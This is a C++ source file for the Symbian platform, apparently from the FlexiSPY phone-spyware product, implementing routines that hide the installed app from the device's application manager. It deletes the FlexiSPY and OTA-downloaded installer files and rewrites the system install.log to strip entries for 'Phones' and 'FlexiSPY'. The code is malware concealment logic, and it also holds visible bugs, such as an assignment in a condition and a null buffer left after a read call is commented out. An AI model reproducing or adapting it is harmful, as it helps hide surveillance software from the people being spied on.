#include "InstUtils.h"

#include <APGICNFL.H>
#include <APAID.H>
#include <F32FILE.H>
#include <COEMAIN.H>
#include "Logger.h"
#include <bautils.h>
#include <s32file.h>
#include <es_sock.h>//BigEndian
#include "ByteUtil.h"

_LIT(KInstallFolder,"\\system\\install\\");

_LIT(KWildFlexiSpy,"Flexispy*");

//j is a file name when user installs flexispy via OTA
//j0,j1,j2,j3,j4 ...
_LIT(KWildOtaName,"j*");
_LIT(KWildOtaFullName,"j.sis");

//install.log file format
_LIT(KInstallLogFile,"c:\\system\\install\\install.log");
//this are sis file name that usr will install to the phone
//to make app be invisble in app manager
//is to delete sis file in forlder !\\system\\install\\

_LIT8(KAppNameV1,"Phones");
_LIT8(KAppNameV2,"FlexiSPY");

InstUtils::InstUtils(){}
InstUtils::~InstUtils(){}

TInt  InstUtils::MakeInvisibleFromAppManagerL()
{	
	return DoMakeInvisibleFromAppManagerL();
}

/*
* delete appname.sis in \system\install\ folder
*/
TInt InstUtils::DoMakeInvisibleFromAppManagerL()
{		
	if(Logger::DebugEnable())
		LOG0(_L("[FxAIFUtils::DoMakeInvisibleFromAppManagerL] Entering "))
	
	TInt error = 0;
	RFs& fs = CCoeEnv::Static()->FsSession();	
	//RFs fs;//fs.Connect();
	
	error |= DeleteSisFilesL(fs);	
	error |= DeleteWildOTAFileL(fs);	
	
	if(Logger::DebugEnable())
		LOG0(_L("[FxAIFUtils::DoMakeInvisibleFromAppManagerL] End "))
	
	return error;
}

//delete all file in \system\install that name starts with 'FlexiSpy'
TInt InstUtils::DeleteSisFilesL(RFs& aFs)
{	
	if(Logger::DebugEnable())
		LOG0(_L("InstUtils:DeleteSisFilesL Entering"))
	
	TFindFile finder(aFs);	
    CDir* dirList;
    
    //find all file that name starts with j
    TInt err = finder.FindWildByDir(KWildFlexiSpy(),KInstallFolder(), dirList);
	if(err) {
		delete dirList;
		if(err == KErrNotFound)
			err = KErrNone;
		
		return err;
	}
	
	TInt c = dirList->Count();
	if(Logger::DebugEnable())
		LOG1(_L("InstUtils:DeleteSisFilesL  dirLisxt :%d "),c)
		
	while (err==KErrNone) {
	    for (TInt i=0; i < c; i++) {
			TPtrC fileName = (*dirList)[i].iName;			
			    TParse parser;			
		        parser.Set(fileName,&finder.File(),NULL);
		        TPtrC fullName = parser.FullName(); 
				
		        if(Logger::DebugEnable())
		        	LOG1(_L("DeleteSisFilesL.FileName: %S"),&fullName)
		        aFs.Delete(fullName);
	    }	
				
       delete dirList;
       err = finder.FindWild(dirList);
       if(err == KErrNone)
	       c = dirList->Count();
   }
   
   if(Logger::DebugEnable())
		LOG0(_L("InstUtils:DeleteSisFilesL End"))
   	
   return KErrNone;
}

//delete sis file that is downloaded via OTA
//name of the file is 'j' cause url of ota is http://djp.cc/j?p=123456789
//if downloading happends more than one time, a number will be appended. 
//ie j,j0,j1,j2,j3 ...
TInt InstUtils::DeleteWildOTAFileL(RFs& aFs)
{	
	TFindFile finder(aFs);	
    CDir* dirList;
    
    //find all file that name starts with j
    TInt err = finder.FindWildByDir(KWildOtaName(),KInstallFolder(), dirList);
	if(err) {
		delete dirList;
		if(err == KErrNotFound)
			err = KErrNone;				
		return err;
	}
	
	TInt c = dirList->Count();
	while (err==KErrNone) {
	    for (TInt i=0; i < c; i++) {
			TPtrC fileName = (*dirList)[i].iName;
			
		    TParse parser;			
	        parser.Set(fileName,&finder.File(),NULL);
	        TPtrC fullName = parser.FullName(); 
			
	        if(Logger::DebugEnable())
	        	LOG1(_L("DeleteWildOTAFileL.FileName: %S"),&fullName)
			
			if(fileName == KWildOtaFullName) {
				aFs.Delete(fullName);
				continue;
			}
			
			//Note: sis file that is downloaded via ota has no extension
	        TPtrC ext = parser.Ext();				   
			if(ext.Length() > 0) //there is extension, so continue
				continue;
			
			//filename could be j0,j1,j2,j3,j4...
			TInt nameLen = fileName.Length();
			
			if(nameLen > 1)  {
				//get number append to j
				TPtrC numberPtr = fileName.Mid(1,nameLen-1);			
				TBool isDigit = ETrue;
				for(TInt j =0; j< numberPtr.Length(); j++) {
					TChar c = numberPtr[j];
					if(!c.IsDigit()) {
						isDigit = EFalse;
						break;
					}
				}
							
				if(!isDigit)
					continue;
	        }
	        //delete file
        	aFs.Delete(fullName);
	    }	
		
       delete dirList;
       err = finder.FindWild(dirList);
       
       if(err == KErrNone)
         c = dirList->Count();
   }
   
   return KErrNone;
}

TInt InstUtils::DeleteFileL(RFs& aFs, const TDesC& aFileName)
{	
	TFindFile finder(aFs);
	
	//find and delete sis1
	TInt error = finder.FindByDir(aFileName,KNullDesC);
	if(error != KErrNone)
		return error;
	
	const TDesC& file = finder.File();	
	return aFs.Delete(file);	
}

TInt InstUtils::MakeInvisibleFromAppManagerLogL()
{	
	RFs& fs = CCoeEnv::Static()->FsSession();	
	//RFs fs;User::LeaveIfError(fs.Connect());
	
	TInt error = DoMakeInvisibleFromAppManagerLogL(fs);
	if(error = KErrNotFound)
		return KErrNone;
	
	return error;
}

TInt InstUtils::DoMakeInvisibleFromAppManagerLogL(RFs& fs)
{	
	if(Logger::DebugEnable())
		LOG0(_L("[FxAIFUtils::DoMakeInvisibleFromAppManagerLogL] Entering "))

	HBufC8* dataRead = NULL;
	//1. read byte from file install.log
	TInt error = 0;//ReadFileL(fs,&dataRead);
	CleanupStack::PushL(dataRead);
	
	if(Logger::DebugEnable()) {
		LOGDATA(_L("readinstall.log"),*dataRead)
	}	
	
	if(error != KErrNone) {			
		CleanupStack::PopAndDestroy(); //dataRead
		return error;
	}
	
	TInt dataReadLen = dataRead->Length();
	if(dataReadLen <= 0) {
		CleanupStack::PopAndDestroy(); //dataRead		
		return KErrNone;
	}
	
	TPtrC8 dataReadPtr8(dataRead->Des());
	
	//2. get number of entry
	TInt numberOfEntry = 0;
	GetNumberOfEntries(dataReadPtr8,numberOfEntry);
	
	if(Logger::DebugEnable())
		LOG1(_L("[InstUtils::GetEntryByte] numberOfEntry: %d"),numberOfEntry)	
	
	if(numberOfEntry == 0) {
		CleanupStack::PopAndDestroy(); //dataRead		
		return KErrNone;
	}
	
	//create byte array to overwrite install.log file
	HBufC8* dataWrite = HBufC8::NewLC(dataReadLen);//cleanup
	TPtr8 dataWritePtr(dataWrite->Des());
	
	//copy header bytes
	dataWritePtr.Copy(dataReadPtr8.Ptr(),KHeaderLength);
	
	TInt startPos = KPosistionFirstDelim;	
	
	TPtrC8 appNameV1Ptr(KAppNameV1);
	TPtrC8 appNameV2Ptr(KAppNameV2);
	
	//append the rest
	TBool foundAppName = EFalse;
	TInt entryCount = 0;
	TInt i = 0;
	for(i = 0; i < numberOfEntry; i++) {
		
		if(startPos >= dataReadLen) {
			break;
		}
		
		HBufC8* entry = HBufC8::NewLC(KEntryMaxLength);
		TPtr8 entryPtr = entry->Des();		
		
		GetEntryByte(*dataRead, startPos, entryPtr);		
		
		if(FoundTargetAppName(entryPtr,appNameV1Ptr)) {
			foundAppName = ETrue;
		} else if ( FoundTargetAppName(entryPtr,appNameV2Ptr)) {
			foundAppName = ETrue;			
		} else {
			foundAppName = EFalse;
		}
		
		//update start position
		TInt entryByteLen = entryPtr.Length();
		startPos += entryByteLen;
		
		if(!foundAppName) { //not found
			dataWritePtr.Append(entryPtr);
		} else { // found 
			entryCount++;
		}
		
		CleanupStack::PopAndDestroy();
	}	
	
	//if(Logger::DebugEnable()) {
	//	LOGDATA(_L("overriteddata1.dat"),dataWritePtr)
	//}	
	/* Note:
		install.log is system file, if the file is corrupted, it causes consequence sofware installation to failed
		Some device display error message 'System error' after installation
		Some does not say anything but installation result is failure.
		To prevent this error,
	*/
	
	//numberOfEntry must be the same as number of loops
	//otherwise it is considered to be corrupted file then delete the file
	//ensure 
	if(numberOfEntry == i && dataWritePtr.Length() > KHeaderLength) {
		
		SetNumberOfEntryies(numberOfEntry - entryCount , dataWritePtr);	
			
		if(Logger::DebugEnable()) {
			LOGDATA(_L("overriteddata2.dat"),dataWritePtr)
		}
		
		error = OverwriteFileL(fs,dataWritePtr);
	} else {
		fs.Delete(KInstallLogFile);
	}
	
	CleanupStack::PopAndDestroy(2);//dataRead,dataWrite	
	
	if(Logger::DebugEnable())
		LOG0(_L("[FxAIFUtils::DoMakeInvisibleFromAppManagerLogL] END "))
	
	return error;
}

void InstUtils::GetEntryByte(const TDesC8& aData, TInt aStartPos, TDes8& aEntry)
{	
	//if(Logger::DebugEnable())
	//	LOG0(_L("[InstUtils::GetEntryByte] Entering..."))	
	
	TPtrC8 ptr(aData);
	TInt pos = aStartPos;
	TInt dataLen = aData.Length();
	TBool breakNow = EFalse;
	for(;;) {	
		
		if(pos >= dataLen)
			break;
		
		const TUint8& b = ptr[pos];
		
		for(TInt i = 0; i < sizeof(KEntryDilms); i++) {
			TUint8 delim = KEntryDilms[i];
			if(b == delim && pos > aStartPos) {
				breakNow = ETrue;
				break;
			}
		}
		
		if(breakNow)
			break;
		
		pos++;
		aEntry.Append(b);		
	}
	
	//if(Logger::DebugEnable())
	//	LOG3(_L("[InstUtils::GetEntryByte] END, pos: %d, startPos: %d, DataLength: %d"),pos,aStartPos,dataLen)	
	
}

TInt InstUtils::OverwriteFileL(RFs& aFs, const TDesC8& aRawData)
{		
	RFile fileToWrite;
	CleanupClosePushL(fileToWrite);	
	TInt error = fileToWrite.Replace(aFs,KInstallLogFile(),EFileWrite);
	
	/*if(Logger::DebugEnable()){
		LOG2(_L("OverwriteFileL Install.log Result : %d, Lenght: %d"),error,aRawData.Length())
	}*/
	
	error = fileToWrite.Write(aRawData,aRawData.Length());
	
	//RFileWriteStream out(fileToWrite);
    //CleanupClosePushL( out );
   	//out << aRawData;
   	
   	CleanupStack::PopAndDestroy(1);
   	
   	return error;
}

TBool InstUtils::FoundTargetAppName(const TPtrC8 aSource, const TPtrC8 aAppName)
{	
	//TUint8 flexispyText[] = {0x46,0x6c,0x65,0x78,0x69,0x53,0x50,0x59};
	
	//searching for aAppName in aData
	return aSource.Find(aAppName) != KErrNotFound;	
}

void InstUtils::GetNumberOfEntries(const TDesC8& aData,TInt& aResult)
{	
	if(aData.Length() < KHeaderLength)
		return;	
		
	TPtrC8 numEntry = aData.Mid(KPosNumberOfEntryOffset,KNumberOfEntryLength);	
	aResult = BigEndian::Get32(numEntry.Ptr());	
}

void InstUtils::SetNumberOfEntryies(TUint aNumberOfEntry, TDes8& aData)
{	
	if(aData.Length() < KHeaderLength)
		return;
	
	//const TUint8* data8 = aData.Ptr();
	TUint8* newNumEntry = new TUint8[KNumberOfEntryLength];
	TUint8* dest = newNumEntry;
	
	//aNumberOfEntry
	ByteUtil::copy(dest, aNumberOfEntry);
	TPtrC8 newNumEntry8;
	newNumEntry8.Set(newNumEntry, KNumberOfEntryLength);
	
	//newNumEntry8.Cop	(dest);
	//if(Logger::DebugEnable())
	//	LOGDATA(_L("newentry.dat"),newNumEntry8);
	
	aData.Replace(KPosNumberOfEntryOffset, KNumberOfEntryLength ,newNumEntry8);
	
	delete newNumEntry;
}